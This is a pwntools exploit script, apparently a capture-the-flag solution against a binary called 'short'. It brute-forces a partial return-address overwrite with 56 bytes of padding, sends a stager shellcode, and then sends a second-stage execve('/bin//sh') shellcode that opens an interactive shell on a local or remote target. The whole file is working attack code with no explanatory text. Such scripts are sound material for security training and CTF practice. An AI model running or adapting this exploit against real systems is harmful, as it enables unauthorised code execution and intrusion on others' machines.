#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

exe = context.binary = ELF(args.EXE or 'short')
elf = exe
filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
break *notcalled+68
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def stage2():
    sc = asm("""
        xor rsi, rsi
        push rsi
        mov rdi, 0x68732f2f6e69622f
        push rdi
        push rsp
        pop rdi
        mov al, 0x3b
        cdq
        syscall
    """)
    # sc = asm(shellcraft.sh())
    io.send(sc)

def solve(r=False):
    sc = asm("""
        mov rsi, r13
        syscall
        call rsi
    """)

    io.send(sc)
    stage2()

    io.interactive()


def main():
    global io
    for i in range(0xf+1):
        try:
            io = start()
            addr = str(hex(i)) + '922'
            overwrite = int(addr, 16)
            r = b'A'*56 + p16(overwrite)
            io.recvuntil('here:')
            io.send(r)
            io.recv(0x3a)
            nl = io.recv()

            if b'You managed' in nl:
                solve(overwrite)
                break
        except EOFError:
            pass

def aslr_off():
    global io
    io = start()
    addr = '0xf922'
    overwrite = int(addr, 16)
    r = b'A'*56 + p16(overwrite)
    io.recvuntil('here:')
    io.send(r)
    io.recv(0x3a)
    nl = io.recv()
    
    solve()

if __name__ == '__main__':
    # aslr_off()
    main()
